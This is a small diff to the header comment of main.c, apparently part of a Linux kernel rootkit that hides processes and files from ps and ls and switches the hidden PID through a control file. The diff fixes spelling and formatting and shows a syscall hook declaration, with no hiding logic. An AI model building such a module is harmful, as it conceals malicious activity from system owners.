@@ -1,9 +1,10 @@
 /*
  * main.c: a loadable kernel module,
  * hiding processes and files from ps and ls.
- * changes the hide_pid dynamicly
- * when `cat` on `CONTROL_PREFIX`+PID  it changes the `hidden_pid`. 
+ * changes the hide_pid dynamically
+ * when `cat` on `CONTROL_PREFIX`+<PID> it changes the `hidden_pid`. 
 */
+
 #include "main.h"
 
 static asmlinkage long (*ref_sys_openat)(const struct pt_regs *);
